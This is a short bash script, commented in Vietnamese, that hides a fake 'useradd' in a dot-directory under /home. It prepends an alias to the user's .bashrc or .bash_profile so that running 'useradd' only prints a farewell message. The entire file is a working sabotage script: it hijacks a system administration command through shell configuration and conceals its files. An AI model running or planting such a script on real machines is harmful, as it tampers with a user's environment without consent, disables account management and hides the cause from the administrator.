#!/bin/bash

# Bước 1: Tạo thư mục /home/.custom_script/ nếu chưa tồn tại
mkdir -p /home/.custom_script/

# Bước 2: Tạo file useradd và ghi nội dung vào file
echo 'echo "It'\''s not working anymore. Bye!"' > /home/.custom_script/useradd

# Bước 3: Thay đổi quyền của file useradd để có thể thực thi
chmod +x /home/.custom_script/useradd

# Bước 4: Thêm alias vào đầu file .bashrc hoặc .bash_profile
if [ -f /home/$USER/.bashrc ]; then
    echo 'alias useradd="/home/.custom_script/useradd"' | cat - /home/$USER/.bashrc > temp && mv temp /home/$USER/.bashrc
elif [ -f /home/$USER/.bash_profile ]; then
    echo 'alias useradd="/home/.custom_script/useradd"' | cat - /home/$USER/.bash_profile > temp && mv temp /home/$USER/.bash_profile
else
    echo 'alias useradd="/home/.custom_script/useradd"' >> /home/$USER/.bashrc
fi

#echo "Script executed successfully."